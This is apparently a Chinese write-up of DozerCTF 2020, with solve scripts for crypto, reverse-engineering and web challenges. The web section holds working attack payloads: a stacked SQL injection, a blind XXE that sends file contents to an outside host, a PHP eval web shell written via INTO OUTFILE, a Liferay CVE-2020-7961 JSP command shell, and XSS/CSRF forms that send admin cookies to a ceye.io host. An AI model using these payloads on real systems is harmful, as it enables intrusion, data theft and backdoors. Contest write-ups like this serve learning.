    NjYyNTU5MDg4MDQzOEE1QzBFMzlFMDJCNzA1MjEzOEUzOEUwN0I1MDg0MTMwRTk4QzgwNDA0MDFDMDN=
    REJDQjk5RDk5Njk3NzVBN0VERkFGOEU3QTg5NzRCQjZFNkU2NkFBNDdDRkQ5N0IzNUZGNkFGNkRBNkJ=
    NTdCRkZFQkZGRTlGQjdDMkQ3NTI3NkE1NkM1MzY5RUE3MzI5QTdCOUQ0RkJBMTZDNzM1NTRBREY5NDd=
    NTNFOTc2NjFCQ0FDMkZCRUJGQzVDOUFGRDZENTk3ODZGMURDNzUyM0FCRTk3QUU1NDAzOUZBRjJFQTX=
    N0E5OTc4NkQyRUQ1QjJGMDMyOUY1OTJBRUVEOTk0N0E5OTRBM0QxRENCREM3REM5NzM4RTY1NUI2RjT=
    QUQzQkU5NDdBMUVDQjNBRjRBNTE5Qjk3RTc4NTVFQUY1NThFQURCQkI1MjlGQkUyRkY1RjBEOUY1OUV=
    

看到这么多行以及这么多等号，易得是base64隐写，脚本一把梭，得到flag

`Dozerctf{itis_e4sy_4U2_analyse}`

## CRYPTO

###  真·签到

先改文件名后缀为txt，然后b64decode->b32decode->b16decode->b58decode

###  eazy_bag

knapsack problem

[安全客的文章](https://www.anquanke.com/post/id/206493#h3-11)就是我写的

直接脚本一把梭

    
    
    a = #填入序列a
    s = #填入密文值
    
    m=[]
    for i in range(len(a)):
        b=[]
        for j in range(len(a)):
            if i == j:
                b.append(1)
            else:
                b.append(0)
        m.append(b)
    
    b=[]
    for i in range(len(a)):
        m[i].append(2**350*a[i])
        b.append(1/2)
    
    b.append(2**350*s)
    m.append(b)
    #print(len(m[0])) 
    M = matrix(QQ, m)
    v = M.LLL()[0]
    print(v)
    flag=''
    for i in v[:-1]:
        if i < 0:
            flag+='0'
            #flag+='1'
        else:
            flag+='1'
            #flag+='0'
    print(hex(int(flag,2))[2:])
    

###  A certain and identical topic

2019*CTF的原题，github有POC

<https://github.com/sixstars/starctf2019/tree/master/crypto-notfeal>

首先交互拿到数据

    
    
    import os
    import string
    from hashlib import sha256
    from pwn import *
    
    context.log_level='debug'
    
    def dopow():
        chal = c.recvline()
        post = chal[12:28]
        tar = chal[33:-1]
        c.recvuntil(':')
        found = iters.bruteforce(lambda x:sha256(x+post).hexdigest()==tar, string.ascii_letters+string.digits, 4)
        c.sendline(found)
    
    
    def doxor(ss,dd):
        res = ''
        for i in range(8):
            res += chr(ord(ss[i])^dd[i])
        return res
    
    def tonum(x):
        return (u32(x[:4])<<32)+u32(x[4:])
    
    def doout(stats):
        print '{',
        for i in range(3):
            print '{',
            for j in range(6):
                print stats[i*6+j],
                if j!=5:
                    print ',',
            print '}',
            if i!=2:
                print ',',
        print '}'
    
    #c = remote('127.0.0.1', 10001)
    c = remote('118.31.11.216', 30026)
    #dopow()
    diffs = [[0,0,0,0,0x80,0x80,0,0], [0x80,0x80,0,0,0x80,0x80,0,0], [0,0,0,2,0,0,0,2]]
    statsp0 = []
    statsc0 = []
    statsp1 = []
    statsc1 = []
    for diff in diffs:
        for i in range(6):
            pt0 = os.urandom(8)
            pt1 = doxor(pt0, diff)
            c.sendlineafter('(hex): ', pt0.encode('hex'))
            ct0 = c.recvline()[:16]
            ct0 = ct0.decode('hex')
            c.sendlineafter('(hex): ', pt1.encode('hex'))
            ct1 = c.recvline()[:16]
            ct1 = ct1.decode('hex')
            statsp0.append(tonum(pt0))
            statsc0.append(tonum(ct0))
            statsp1.append(tonum(pt1))
            statsc1.append(tonum(ct1))
    
    c.sendlineafter('(hex): ', 'go')
    c.recvuntil('flag:n')
    cflag = c.recvline()
    
    doout(statsp0)
    doout(statsc0)
    doout(statsp1)
    doout(statsc1)
    
    print cflag
    

首先爆破子密钥

POC.cz

    
    
    // this file has been modified and you can recover subkey for each round interactively
    
    //Differential Cryptanalysis of FEAL-4
    //Uses a chosen-plaintext attack to fully recover the key
    //For use with tutorial at http://theamazingking.com/crypto-feal.php
    
    #include <stdio.h>
    #include <math.h>
    #include <stdint.h>
    
    #define MAX_CHOSEN_PAIRS 10000
    #define ROTATE_LEFT(x, n) (((x) << (n)) | ((x) >> (32-(n))))
    
    int winner = 0;
    int loser = 0;
    
    unsigned long subkey[6];
    unsigned long statickey[6] = { 0x6bb508a,0xd72eaec0,0x71d88eee,0xa5da0171,0x3139398f,0x2ccdf0f0 };
    
    unsigned char rotl2(unsigned char a) { return ((a << 2) | (a >> 6)); }
    
    unsigned long leftHalf(unsigned long long a) { return (a >> 32LL); }
    unsigned long rightHalf(unsigned long long a) { return a; }
    unsigned char sepByte(unsigned long a, unsigned char index) { return a >> (8 * index); }
    unsigned long combineBytes(unsigned char b3, unsigned char b2, unsigned char b1, unsigned char b0)
    {
        return b3 << 24L | (b2 << 16L) | (b1 << 8L) | b0;
    }
    unsigned long long combineHalves(unsigned long leftHalf, unsigned long rightHalf)
    {
        return (((unsigned long long)(leftHalf)) << 32LL) | (((unsigned long long)(rightHalf)) & 0xFFFFFFFFLL);
    }
    
    unsigned char gBox(unsigned char a, unsigned char b, unsigned char mode)
    {
        return rotl2(a + b + mode);
    }
    
    unsigned long fBox(unsigned long plain)
    {
        unsigned char x0 = sepByte(plain, 0);
        unsigned char x1 = sepByte(plain, 1);
        unsigned char x2 = sepByte(plain, 2);
        unsigned char x3 = sepByte(plain, 3);
    
        unsigned char t0 = (x2 ^ x3);
    
        unsigned char y1 = gBox(x0 ^ x1, t0, 1);
        unsigned char y0 = gBox(x0, y1, 0);
        unsigned char y2 = gBox(t0, y1, 0);
        unsigned char y3 = gBox(x3, y2, 1);
    
        return combineBytes(y0, y1, y2, y3);
        //return combineBytes(y3, y2, y1, y0);
    }
    
    unsigned long long encrypt(unsigned long long plain)
    {
        unsigned long left = leftHalf(plain);
        unsigned long right = rightHalf(plain);
        //printf("%x,%xn",left,right);
    
        left = left ^ subkey[4];
        right = right ^ subkey[5];
        right = right ^ left;
        //printf("%x,%xn",left,right);
    
        unsigned long round2Right = left;
        unsigned long round2Left = right ^ fBox(left ^ subkey[0]);
        //printf("after k0: %x,%xn",round2Left,round2Right);
    
        unsigned long round3Right = round2Left;
        unsigned long round3Left = round2Right ^ fBox(round2Left ^ subkey[1]);
        //printf("after k1: %x,%xn",round3Left,round3Right);
    
        unsigned long round4Right = round3Left;
        unsigned long round4Left = round3Right ^ fBox(round3Left ^ subkey[2]);
        //printf("after k2: %x,%xn",round4Left,round4Right);
    
        left = round4Right ^ fBox(round4Left ^ subkey[3]);
        right = round4Left;
        //printf("after k3: %x,%xn",left,right);
        unsigned long cipherRight = left ^ right;
        unsigned long cipherLeft = right;
        //printf("%x,%xn",cipherLeft,cipherRight);
    
        return combineHalves(cipherLeft, cipherRight);
    }
    
    void generateSubkeys(int seed)
    {
        srand(seed);
    
        int c;
        for (c = 0; c < 6; c++)
            //subkey[c] = (rand() << 16L) | (rand() & 0xFFFFL);
            subkey[c] = statickey[c];
    }
    
    int numPlain;
    unsigned long long plain0[MAX_CHOSEN_PAIRS];
    unsigned long long cipher0[MAX_CHOSEN_PAIRS];
    unsigned long long plain1[MAX_CHOSEN_PAIRS];
    unsigned long long cipher1[MAX_CHOSEN_PAIRS];
    unsigned long long statsp0[3][6] = { { 334750566828076423 , 14598798383091910896 , 7362627570683058495 , 13061853162603734587 , 1089167770670218094 , 17743978066697931267 } , { 8114919877170383009 , 4550952407898372987 , 7285893453974094070 , 10800961177820396850 , 4729992887711911505 , 12448229247856667657 } , { 7958106831885282721 , 4689555180493185263 , 1587569058779522562 , 18329783110864205218 , 2434120028102900466 , 15842198057420313606 } };
    unsigned long long statsc0[3][6] = { { 17018258111090692558 , 4926176093594960481 , 12958472494695275414 , 296532034877147054 , 1623835293301588483 , 8363277828096518872 } , { 3063858680351852201 , 10646101081212077820 , 15397342153794659053 , 10801501799668663670 , 17229473246650265091 , 8099425474283857864 } , { 15867189407617151753 , 661452670953466009 , 10540986253208519300 , 18255646694794273988 , 5880631140809782311 , 14623112566573913744 } };
    unsigned long long statsp1[3][6] = { { 334750566828043527 , 14598798383091878000 , 7362627570683025855 , 13061853162603701947 , 1089167770670250990 , 17743978066697964163 } , { 8114778589926246433 , 4551093695142509563 , 7285753266241585270 , 10800819890576194994 , 4730134174956113617 , 12448087960612465801 } , { 7813991643775872417 , 4833670368535486703 , 1443453870737221122 , 18185667922821903778 , 2578235216145201906 , 15698082869378012166 } };
    unsigned long long statsc1[3][6] = { { 10093771275142207713 , 7225202440948577749 , 10650264112472712722 , 16511768989482887425 , 3927611061609309492 , 6055244609925753539 } , { 17108331246921735026 , 4814782841167528319 , 17638696549988693696 , 5747466028523721217 , 15490696876033367847 , 17706088208678251576 } , { 10548930562483154223 , 7020273959868597499 , 6725024520067991760 , 12375375273599356543 , 5936183591201277651 , 10399017144689224464 } };
    
    void undoFinalOperation()
    {
        int c;
        for (c = 0; c < numPlain; c++)
        {
            unsigned long cipherLeft0 = leftHalf(cipher0[c]);
            unsigned long cipherRight0 = rightHalf(cipher0[c]) ^ cipherLeft0;
            unsigned long cipherLeft1 = leftHalf(cipher1[c]);
            unsigned long cipherRight1 = rightHalf(cipher1[c]) ^ cipherLeft1;
    
            cipher0[c] = combineHalves(cipherLeft0, cipherRight0);
            cipher1[c] = combineHalves(cipherLeft1, cipherRight1);
        }
    }
    
    unsigned long crackLastRound(unsigned long outdiff)
    {
        printf("  Using output differential of 0x%08xn", outdiff);
        printf("  Cracking...");
    
        unsigned long fakeK;
        for (fakeK = 0x00000000L; fakeK < 0xFFFFFFFFL; fakeK++)
        {
            int score = 0;
    
            int c;
            for (c = 0; c < numPlain; c++)
            {
                unsigned long Y0 = leftHalf(cipher0[c]);
                unsigned long Y1 = leftHalf(cipher1[c]);
    
                unsigned long fakeInput0 = Y0 ^ fakeK;
                unsigned long fakeInput1 = Y1 ^ fakeK;
                unsigned long fakeOut0 = fBox(fakeInput0) ^ rightHalf(cipher0[c]);
                unsigned long fakeOut1 = fBox(fakeInput1) ^ rightHalf(cipher1[c]);
                uint32_t fakeDiff = fakeOut0 ^ fakeOut1;
    
                if (fakeDiff == outdiff) score++; else break;
            }
    
            if (score == numPlain)
            {
                printf("%d", score);
                printf("found subkey : 0x%08lxn", fakeK);
                //return fakeK;
            }
        }
    
        printf("failedn");
        return 0;
    }
    
    void chosenPlaintext(unsigned long long diff)
    {
        int c = -1;
        if (diff == 0x0000000000008080LL) {
            c = 0;
        }
        else if (diff == 0x0000808000008080LL) {
            c = 1;
        }
        else if (diff == 0x0200000002000000LL) {
            c = 2;
        }
        for (int i = 0; i < numPlain; i++) {
            plain0[i] = statsp0[c][i];
            plain1[i] = statsp1[c][i];
            cipher0[i] = statsc0[c][i];
            cipher1[i] = statsc1[c][i];
        }
    }
    
    void undoLastRound(unsigned long crackedSubkey)
    {
        int c;
        for (c = 0; c < numPlain; c++)
        {
            unsigned long cipherLeft0 = leftHalf(cipher0[c]);
            unsigned long cipherRight0 = rightHalf(cipher0[c]);
            unsigned long cipherLeft1 = leftHalf(cipher1[c]);
            unsigned long cipherRight1 = rightHalf(cipher1[c]);
    
            cipherRight0 = cipherLeft0;
            cipherRight1 = cipherLeft1;
            cipherLeft0 = fBox(cipherLeft0 ^ crackedSubkey) ^ rightHalf(cipher0[c]);
            cipherLeft1 = fBox(cipherLeft1 ^ crackedSubkey) ^ rightHalf(cipher1[c]);
    
    
            cipher0[c] = combineHalves(cipherLeft0, cipherRight0);
            cipher1[c] = combineHalves(cipherLeft1, cipherRight1);
        }
    }
    
    void prepForCrackingK0()
    {
        int c;
        for (c = 0; c < numPlain; c++)
        {
            unsigned long cipherLeft0 = leftHalf(cipher0[c]);
            unsigned long cipherRight0 = rightHalf(cipher0[c]);
            unsigned long cipherLeft1 = leftHalf(cipher1[c]);
            unsigned long cipherRight1 = rightHalf(cipher1[c]);
    
            unsigned long tempLeft0 = cipherLeft0;
            unsigned long tempLeft1 = cipherLeft1;
            cipherLeft0 = cipherRight0;
            cipherLeft1 = cipherRight1;
            cipherRight0 = tempLeft0;
            cipherRight1 = tempLeft1;
    
            cipher0[c] = combineHalves(cipherLeft0, cipherRight0);
            cipher1[c] = combineHalves(cipherLeft1, cipherRight1);
        }
    }
    
    int main()
    {
        /*
            generateSubkeys(time(NULL));
            cipher0[0] = encrypt(0x3433323138373635);
            printf("---n");
            cipher1[0] = encrypt(0x3433323138373635^0x8080);
            //cipher1[0] = encrypt(0x3433323138373635^0x808000008080);
            //cipher1[0] = encrypt(0x3433323138373635^0x200000002000000);
            printf("---n");
            printf("%llxn", cipher0[0]) ;
            printf("%llxn", cipher1[0]) ;
            numPlain = 1;
            undoFinalOperation();
            undoLastRound(subkey[3]);
            undoLastRound(subkey[2]);
            undoLastRound(subkey[1]);
            printf("%llxn", cipher0[0]) ;
            printf("%llxn", cipher1[0]) ;
            return 0;
            */
        printf("JK'S FEAL-4 DIFFERENTIAL CRYPTANALYSIS DEMOn");
        printf("-------------------------------------------n");
        printf("n");
    
    
        int graphData[20];
    
        int c;
    
        generateSubkeys(time(NULL));
        numPlain = 6;
        unsigned long long inputDiff1 = 0x0000000000008080LL;
        unsigned long long inputDiff2 = 0x0000808000008080LL;
        unsigned long long inputDiff3 = 0x0200000002000000LL;
        unsigned long outDiff = 0x02000000L;
    
        unsigned long fullStartTime = time(NULL);
    
        //CRACKING ROUND 4
        printf("ROUND 4n");
        chosenPlaintext(inputDiff1);
        undoFinalOperation();
        unsigned long startTime = time(NULL);
        unsigned long crackedSubkey3 = crackLastRound(outDiff);
        //unsigned long crackedSubkey3 = subkey[3];
        //unsigned long crackedSubkey3 = 0x00d13ef9;
        //unsigned long crackedSubkey3 = 0x00d1be79;
        printf("%xn", crackedSubkey3);
        unsigned long endTime = time(NULL);
        printf("  Time to crack round #4 = %i secondsn", (endTime - startTime));
    
        //CRACKING ROUND 3
        printf("ROUND 3n");
        chosenPlaintext(inputDiff2);
        undoFinalOperation();
        undoLastRound(crackedSubkey3);
        startTime = time(NULL);
        unsigned long crackedSubkey2 = crackLastRound(outDiff);
        //unsigned long crackedSubkey2 = subkey[2];
        //unsigned long crackedSubkey2 = 0x3a9907f0;
        //unsigned long crackedSubkey2 = 0x3a998770;
        printf("%xn", crackedSubkey2);
        endTime = time(NULL);
        printf("  Time to crack round #3 = %i secondsn", (endTime - startTime));
    
        //CRACKING ROUND 2
        printf("ROUND 2n");
        chosenPlaintext(inputDiff3);
        undoFinalOperation();
        undoLastRound(crackedSubkey3);
        undoLastRound(crackedSubkey2);
        startTime = time(NULL);
        unsigned long crackedSubkey1 = crackLastRound(outDiff);
        //unsigned long crackedSubkey1 = 0x1f052d05;
        //unsigned long crackedSubkey1 = 0x1f05ad85;
        printf("%xn", crackedSubkey1);
        endTime = time(NULL);
        printf("  Time to crack round #2 = %i secondsn", (endTime - startTime));
    
        //CRACK ROUND 1
        printf("ROUND 1n");
        undoLastRound(crackedSubkey1);
        unsigned long crackedSubkey0 = 0;
        unsigned long crackedSubkey4 = 0;
        unsigned long crackedSubkey5 = 0;
    
        printf("  Cracking...");
    
        startTime = time(NULL);
        uint32_t guessK0;
        for (guessK0 = 0; guessK0 < 0xFFFFFFFFL; guessK0++)
        {
            uint32_t guessK4 = 0;
            uint32_t guessK5 = 0;
            int c;
            for (c = 0; c < numPlain; c++)
            {
                uint32_t plainLeft0 = leftHalf(plain0[c]);
                uint32_t plainRight0 = rightHalf(plain0[c]);
                uint32_t cipherLeft0 = leftHalf(cipher0[c]);
                uint32_t cipherRight0 = rightHalf(cipher0[c]);
    
                uint32_t tempy0 = fBox(cipherLeft0 ^ guessK0) ^ cipherRight0;
    
                if (guessK4 == 0)
                {
                    guessK4 = cipherLeft0 ^ plainLeft0;
                    guessK5 = tempy0 ^ cipherLeft0 ^ plainRight0;
                }
                else if (((cipherLeft0 ^ plainLeft0) != guessK4) || ((tempy0 ^ cipherLeft0 ^ plainRight0) != guessK5))
                {
                    guessK4 = 0;
                    guessK5 = 0;
                    break;
                }
            }
            if (guessK4 != 0)
            {
    
                crackedSubkey0 = guessK0;
                crackedSubkey4 = guessK4;
                crackedSubkey5 = guessK5;
                endTime = time(NULL);
    
                printf("found subkeys : 0x%08lx  0x%08lx  0x%08lxn", guessK0, guessK4, guessK5);
                printf("  Time to crack round #1 = %i secondsn", (endTime - startTime));
                //break;
    
            }
        }
    
        printf("nn");
        printf("0x%08lx - ", crackedSubkey0); if (crackedSubkey0 == subkey[0]) printf("Subkey 0 : GOOD!n"); else printf("Subkey 0 : BADn");
        printf("0x%08lx - ", crackedSubkey1); if (crackedSubkey1 == subkey[1]) printf("Subkey 1 : GOOD!n"); else printf("Subkey 1 : BADn");
        printf("0x%08lx - ", crackedSubkey2); if (crackedSubkey2 == subkey[2]) printf("Subkey 2 : GOOD!n"); else printf("Subkey 2 : BADn");
        printf("0x%08lx - ", crackedSubkey3); if (crackedSubkey3 == subkey[3]) printf("Subkey 3 : GOOD!n"); else printf("Subkey 3 : BADn");
        printf("0x%08lx - ", crackedSubkey4); if (crackedSubkey4 == subkey[4]) printf("Subkey 4 : GOOD!n"); else printf("Subkey 4 : BADn");
        printf("0x%08lx - ", crackedSubkey5); if (crackedSubkey5 == subkey[5]) printf("Subkey 5 : GOOD!n"); else printf("Subkey 5 : BADn");
        printf("n");
    
        unsigned long fullEndTime = time(NULL);
        printf("Total crack time = %i secondsn", (fullEndTime - fullStartTime));
    
    
        printf("FINISHEDn");
        system("pause");
        return 0;
    }
    

子密钥有多解，但是影响不大，可以忽略

然后在题目文件上直接写解密函数

    
    
    import os,random,sys,string
    from hashlib import sha256
    import SocketServer
    import signal
    
    FLAG=""
    
    SZ = 8
    
    def gbox(a,b,mode):
        x = (a+b+mode)%256
        return ((x<<2)|(x>>6))&0xff
    
    def fbox(plain):
        t0 = (plain[2] ^ plain[3])
        y1 = gbox(plain[0] ^ plain[1], t0, 1)
        y0 = gbox(plain[0], y1, 0)
        y2 = gbox(t0, y1, 0)
        y3 = gbox(plain[3], y2, 1)
    
        return [y3, y2, y1, y0]
    
    def doxor(l1,l2):
        #print l1,l2
        return map(lambda x: x[0]^x[1], zip(l1,l2))
    
    def encrypt_block(pt, ks):
        kss = ['08ad5f9c','1f05ad85','3a9907f0','00d13ef9','6e20bbb2','c86367d0']
        ks = [map(ord,i.decode("hex")) for i in kss]
        l = doxor(pt[:4], ks[4])
        r = doxor(doxor(pt[4:], ks[5]), l)
    
        for i in range(4):
            l, r = doxor(r, fbox(doxor(l,ks[i]))), l
    
        l, r = r, doxor(l,r)
        return l+r
    
    def decrypt_block(pt, ks):
        ksss = ['08ad5f9c','1f05ad85','3a9907f0','00d13ef9','6e20bbb2','c86367d0']
        kss = [map(ord,i.decode("hex")) for i in ksss]
        ks = [i[::-1] for i in kss]
        #print ks
        #print pt
        l = pt[:4]
        r = pt[4:]
        #print l,r
        r, l = l, doxor(l,r)
    
        for i in range(3,-1,-1):
            l, r = r, doxor(l, fbox(doxor(r,ks[i])))
        r = doxor(doxor(r, ks[5]), l)
        l = doxor(l, ks[4])
        return l+r
    
    def encrypt(pt, k):
        #print pt
        ct = ''
    
        for i in range(0, len(pt), SZ):
            res = encrypt_block(map(ord, pt[i:i+SZ]), k)
            ct += ''.join(map(chr,res))
        return ct.encode('hex')
    
    def decrypt(pt, k):
        #print pt
        ct = ''
    
        for i in range(0, len(pt), SZ):
            res = decrypt_block(map(ord, pt[i:i+SZ]), k)
            ct += ''.join(map(chr,res))
        print ct
        return ct.encode('hex')
    
    def doout(x):
        tmp = ''.join(map(chr, x))
        return tmp.encode('hex')
    
    def genkeys():
        subkeys=[]
        for x in xrange(6):
            subkeys.append(map(ord,os.urandom(4)))
        return subkeys
    
    class Task(SocketServer.BaseRequestHandler):
        def proof_of_work(self):
            random.seed(os.urandom(8))
            proof = ''.join([random.choice(string.ascii_letters+string.digits) for _ in xrange(20)])
            digest = sha256(proof).hexdigest()
            self.request.send("sha256(XXXX+%s) == %sn" % (proof[4:],digest))
            self.request.send('Give me XXXX:')
            x = self.request.recv(10)
            x = x.strip()
            if len(x) != 4 or sha256(x+proof[4:]).hexdigest() != digest: 
                return False
            return True
    
        def recvhex(self, sz):
            try:
                r = sz
                res = ''
                while r>0:
                    res += self.request.recv(r)
                    if res.endswith('n'):
                        r = 0
                    else:
                        r = sz - len(res)
                res = res.strip()
                res = res.decode('hex')
            except:
                res = ''
            return res
    
        def dosend(self, msg):
            try:
                self.request.sendall(msg)
            except:
                pass
    
        def handle(self):
            #if not self.proof_of_work():
            #    return
            key = genkeys()
    
            print key
            for i in xrange(50):
                self.dosend("plaintext(hex): ")
                pt = self.recvhex(21)
                if pt=='':
                    break
                ct = encrypt(pt, key)
                self.dosend("%sn" % ct.encode('hex'))
            cflag = encrypt(FLAG, key)
            self.dosend("and your flag:n")
            self.dosend("%sn" % cflag.encode('hex'))
            self.request.close()
    
    
    class ForkedServer(SocketServer.ForkingTCPServer, SocketServer.TCPServer):
        pass
    
    print decrypt('6f342d1097841c6dd0f342d64a30add678e4b6d16be2497e5520df87b81d1f50'.decode('hex'),0)
    #if __name__ == "__main__":
        #HOST, PORT = '0.0.0.0', 10001
        #print HOST
        #print PORT
        #server = ForkedServer((HOST, PORT), Task)
        #server.allow_reuse_address = True
        #server.serve_forever()
    

运行得到flag：`Dozerctf{****************}`

## RE

###  貌似有一些不对

直接运行失败，放入ida搜字符串

发现有一个换表base64，表也给了

然后再栅栏一下得到flag

###  dozer_vm_plus

这道题应该非预期了，发现可以逐字节爆破，如果输入正确，回显会多一个行，所以爆破脚本

    
    
    from pwn import *
    from string import *
    table =printable
    FLAG='DozerCtf{'
    lenth=11
    for i in range(50):
        for j in printable:
            flag=FLAG+j
            sh=process('./mac')
            sh.recv()
            sh.sendline(flag)
            ans = sh.recvuntil("FLAG!").split("n")
            if len(ans) > lenth:
                Flag+=j
                lenth+=1
                print FLAG
                break
            #sh.interactive()
    

![](https://i.loli.net/2020/06/14/pnYEhlP7BbIUo93.png)

补一个`}`就行了。

###  easy_maze

先用UPXUnPacKer脱个壳

然后ida打开，找到地图

![](https://i.loli.net/2020/06/15/jt6vUxQMGzYfbcI.png)

根据引用找到关键函数，然后手工走一波

SSSSDDDWWWDDSSSSSAAAASSDDDDSSSDDWWWWDDDSSSSD

发现不行，换键了，大概这样

W: 上下颠倒  
A： 左移一位  
S：上下颠倒 左右颠倒  
D：右移一位

写脚本

    
    
    a = 'SSSSDDDWWWDDSSSSSAAAASSDDDDSSSDDWWWWDDDSSSSD'
    c = a.replace('W','0')
    c = c.replace('A','1')
    c = c.replace('S','2')
    c = c.replace('D','3')
    b = ['W','A','S','D']
    print(c)
    for i in range(len(c)):
          if( c[i] == '0'):
                print(b[eval(c[i])],end='')
                t=b[0]
                b[0]=b[2]
                b[2]=t
          if( c[i] == '1'):
                print(b[eval(c[i])],end='')
                t=b[0]
                b[0]=b[1]
                b[1]=b[2]
                b[2]=b[3]
                b[3]=t
          if( c[i] == '2'):
                print(b[eval(c[i])],end='')
                t=b[0]
                b[0]=b[2]
                b[2]=t
                t=b[1]
                b[1]=b[3]
                b[3]=t
          if( c[i] == '3'):
                print(b[eval(c[i])],end='')
                t=b[3]
                b[3]=b[2]
                b[2]=b[1]
                b[1]=b[0]
                b[0]=t
    
    结果：SWSWDSAADAWADADADSAWDADWASDADASDDADAWASWSWSD
    

SWSWDSAADAWADADADSAWDADWASDADASDDADAWASWSWSD的md5值为flag。

## web

###  sqli-labs 0

引号要二次url编码闭合,然后ban了select可以堆叠注入绕过

对了还有大小写问题

    
    
    http://118.31.11.216:30501/?id=1%2527;sEt @a=0x1; prEpare dump from @a;execute dump;
    
    
    select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c6167
    
    select group_concat(table_name) from information_schema.tables where table_schema=database()
    
    select * from information_schema.tables where table_schema=database() and table_name='uziuzi'* 
    
    select * from uziuzi
    
    //结果
    
    Your ID:information_schema,mysql,performance_schema,security 
    
    
    emails,referers,uagents,users,uziuzi 
    
    
    
    // 查flag
    http://118.31.11.216:30501/?id=1%2527;sEt%20@a=0x73656c656374202a2066726f6d20757a69757a69;%20prEpare%20dump%20from%20@a;execute%20dump;
    

###  白给的反序列化

真的白给,waf什么都不用绕

method 传mysys,args传[‘flag.php’]就出了

###  svgggggg!

svg是xml的,搜到了一个svg任意文件读的,但是这个没回显,开始自己构造盲打是xxe没成功,后来谷歌的一个别人构造的,成功读到文件

<https://blog.csdn.net/a3320315/article/details/104334735>

<https://www.rootnetsec.com/bsidessf-svgmagick/>

<https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/>

    
    
    //svg2
    
    <?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [  
       <!ELEMENT svg ANY >
       <!ENTITY % remote SYSTEM "http://ip/test.xml" >
    %remote;%template;
       ]><svg height="100" width="1000">&res;</svg>
    
    
    
    //test.xml
    
    <!ENTITY % secret SYSTEM "php://filter/convert.base64-encode/resource=file:///app/H3re_1s_y0ur_f14g.php" >
    <!ENTITY % template "<!ENTITY res SYSTEM 'http://w.ip:3001/?a=%secret;'>">
    
    
    //server.py
    //其一个flask方便看结果
    
    import requests
    from flask import Flask
    from flask import request
    
    import base64
    
    app = Flask(__name__)
    
    
    @app.route('/')
    def index():
        result = request.args.get('a', '').replace(' ', '+')
        print(result)
        print(base64.b64decode(result).decode())
        print('')
        return '<h1>Hello World</h1>'
    
    
    app.run('0.0.0.0', port=3001)
    
    
    
    读用户,命令读出
    
    cd /app
    php -S 0.0.0.0:8080
    
    8080起了一个php
    
    
    
    用file读一下源码
    
    
    <!doctype html>
    <html>
    <head>
    <meta charset="UTF-8">
    <title>index</title>
    </head>
    Hi!
    You Find Me .
    Flag is nearby.
    <body>
    </body>
    </html>
    
    <?php 
    
    $conn=mysql_connect('127.0.0.1','root','');
    mysql_select_db('security');
    
    if ($_GET['id']){
        $id = $_GET['id'];
    }
    else 
        $id = 1;
    $sql = "select * from user where id='$id'";
    $result = mysql_query($sql,$conn);
    $arr = mysql_fetch_assoc($result);
    print_r($arr);
    
    ?>
    
    
    1' union select 1,'<?php var_dump(12);eval($_REQUEST[a]);?>',3 into outfile '/app/shell.php
    
    
    写shell进去,scandir列目录,file读flag
    

###  简单域渗透-flag1

参考

<https://github.com/vulhub/vulhub/tree/master/liferay-portal/CVE-2020-7961>

<https://www.cnblogs.com/tr1ple/p/12608731.html#NmdGyEkb>

<https://github.com/mzer0one/CVE-2020-7961-POC>

可以执行cmd,

    
    
    import java.io.FileWriter;
    
    public class LifExp {
    
    static {
    try {
        String payload = "<%"    if("023".equals(request.getParameter("pwd"))){"        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();"        int a = -1;"        byte[] b = new byte[2048];"        out.print("<pre>");"        while((a=in.read(b))!=-1){"            out.println(new String(b));"        }"        out.print("</pre>");"    }"%>";
        FileWriter writer = new FileWriter("../webapps/ROOT/html/wendell.jsp");
        writer.write(payload);
        writer.close();
    
    String cmd = "ping wa.ik1fh0.ceye.io";
    java.lang.Runtime.getRuntime().exec(cmd).waitFor();
    } catch ( Exception e ) {
    e.printStackTrace();
    }
    }
    }
    

在web路径写一个jsp马,

然后桌面读出flag

###  fake phpminiadmin

给了提示是xxs

select 0x16进制绕过过滤,直接xss了

然后这个是post

CSRF构造一下

放在自己服务器

    
    
    <html>
      <!-- CSRF PoC - generated by Burp Suite Professional -->
      <body>
      <script>history.pushState('', '', '/')</script>
        <form id ='formid'  action="http://118.31.11.216:30004/sql.php" method="POST">
          <input type="hidden" name="sql" value="select 0x205c223e3c64657461696c73206f70656e206f6e746f67676c653d77696e646f772e6c6f636174696f6e2e687265663d272f2f636f6f6b69652e696b316668302e636579652e696f2f3f272b62746f6128646f63756d656e742e636f6f6b6965293e;" />
          <input type="submit" value="Submit request" />
        </form>
    
      <script>
      var form = document.getElementById('formid');
    form.submit();
    </script>
      </body>
    </html>
    

就可以打管理cookie

服务器的日志看到admin_shark.php页面

用上次安恒月赛的构造请求访问一下

    
    
    <script >xmlhttp=new XMLHttpRequest();
    xmlhttp[`x6fnreadystatechange`]=()=>{if(xmlhttp.readyState==4 && xmlhttp.status==200){document[`x6cocatix6fn`][`href`]=`http://cookie.ik1fh0.ceye.io/`+btoa(xmlhttp[`x72espox6eseText`]);}};xmlhttp.open(`GET`,`/admin_shark.php`,true);xmlhttp.send();</script>
    
    
    
    <html>
      <!-- CSRF PoC - generated by Burp Suite Professional -->
      <body>
      <script>history.pushState('', '', '/')</script>
        <form id ='formid'  action="http://118.31.11.216:30004/sql.php" method="POST">
          <input type="hidden" name="sql" value="select 0x3c736372697074203e786d6c687474703d6e657720584d4c487474705265717565737428293b0a786d6c687474705b605c7836666e726561647973746174656368616e6765605d3d28293d3e7b696628786d6c687474702e726561647953746174653d3d3420262620786d6c687474702e7374617475733d3d323030297b646f63756d656e745b605c7836636f636174695c7836666e605d5b6068726566605d3d60687474703a2f2f636f6f6b69652e696b316668302e636579652e696f2f602b62746f6128786d6c687474705b605c7837326573706f5c783665736554657874605d293b7d7d3b786d6c687474702e6f70656e2860474554602c602f61646d696e5f736861726b2e706870602c74727565293b786d6c687474702e73656e6428293b3c2f7363726970743e;" />
          <input type="submit" value="Submit request" />
        </form>
    
      <script>
      var form = document.getElementById('formid');
    form.submit();
    </script>
      </body>
    </html>
    

拿到flag

###  babay waf

这里泄露的请求地址, 直接上guoke的车了

![](https://i.loli.net/2020/06/15/Mc7kNKbujfT5hi4.png)

看到guoke.php大胆猜一下就是一句话,然后爆出来密码是1,

还看到,antproxy.php,蚁剑绕dis_func 剩下的2333

传大马,连上去直接搜出来flag

